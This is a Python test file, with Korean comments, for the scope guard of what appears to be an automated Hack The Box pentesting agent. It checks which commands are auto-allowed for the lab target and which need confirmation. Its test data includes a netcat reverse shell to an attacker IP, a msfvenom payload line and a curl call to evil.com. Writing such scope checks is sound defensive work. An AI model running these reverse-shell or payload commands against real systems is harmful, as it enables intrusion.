# 실행: htb-agent 디렉토리에서  python3 tests/test_scope.py
import sys
sys.path.insert(0, "src")
from htb_agent.scope_guard import ScopeGuard, ScopeViolation, IPClass

passed = failed = 0
def check(name, cond):
    global passed, failed
    if cond: passed += 1; print(f"  ✅ {name}")
    else:    failed += 1; print(f"  ❌ {name}")

# 가상의 /etc/hosts (HTB vhost 워크플로)
HOSTS = {"machine.htb": "10.129.1.5", "dev.machine.htb": "10.129.1.5"}

print("=== 바인딩 ===")
g = ScopeGuard.from_cidr_strings()
check("타겟 바인딩 성공(HTB 대역)", str(g.bind_target("10.129.1.5")) == "10.129.1.5")
try:
    ScopeGuard.from_cidr_strings().bind_target("8.8.8.8"); check("범위밖 타겟 거부", False)
except ScopeViolation:
    check("범위밖 타겟 거부", True)
# 바인딩 전 검사 → fail-closed
try:
    ScopeGuard.from_cidr_strings().inspect_command("nmap 10.129.1.5"); check("바인딩 전 검사 거부", False)
except ScopeViolation:
    check("바인딩 전 검사 거부", True)

g.add_attacker_ip("10.10.14.5")  # 공격자 VPN IP

print("\n=== 초안에서 결함이던 6케이스 재검증 ===")
def auto(cmd): return g.inspect_command(cmd, hosts_map=HOSTS).auto_allowed
def needs(cmd): return g.inspect_command(cmd, hosts_map=HOSTS).needs_confirmation

check("1 정상 타겟 스캔 자동허용", auto("nmap -sV 10.129.1.5"))
check("2 인터넷 IP → 추가확인", not auto("nmap 8.8.8.8") and "8.8.8.8" in needs("nmap 8.8.8.8"))
check("3 호스트네임 vhost 해석→타겟 자동허용", auto("curl http://machine.htb/admin"))
check("4 리버스셸 공격자IP 자동허용", auto("nc 10.10.14.5 4444 -e /bin/bash"))
check("5 타겟+공격자 혼합 자동허용", auto("msfvenom LHOST=10.10.14.5 LPORT=443 RHOST=10.129.1.5 -f elf"))
check("6 버전문자 4.3.2.1 → 추가확인(하드차단 아님)", not auto("nmap --script-args ver=4.3.2.1 10.129.1.5"))

print("\n=== 추가 케이스 ===")
check("7 서브도메인 vhost 해석 자동허용", auto("ffuf -u http://dev.machine.htb/FUZZ -w list.txt"))
check("8 로컬 명령(대상없음) 자동허용", auto("cat loot.txt"))
check("9 미해석 .htb → 추가확인", not g.inspect_command("curl http://unknown.htb/", hosts_map={}).auto_allowed)
check("10 외부 도메인 → 추가확인", "evil.com(외부)" in g.inspect_command("curl http://evil.com/", hosts_map={}).needs_confirmation)
check("11 loopback 자동허용", auto("curl http://127.0.0.1:8000/"))
check("12 파일명 loot.txt 호스트 오탐 없음",
      all(tok != "loot.txt" for tok, _, _ in g.inspect_command("cat loot.txt", hosts_map=HOSTS).classified))
# 분류 정확성
r = g.inspect_command("nmap 10.129.1.5", hosts_map=HOSTS)
check("13 타겟 분류 TARGET", any(c==IPClass.TARGET for _,c,_ in r.classified))
r = g.inspect_command("nc 10.10.14.5 9001", hosts_map=HOSTS)
check("14 공격자 분류 ATTACKER", any(c==IPClass.ATTACKER for _,c,_ in r.classified))

print(f"\n결과: {passed} passed, {failed} failed")
sys.exit(1 if failed else 0)
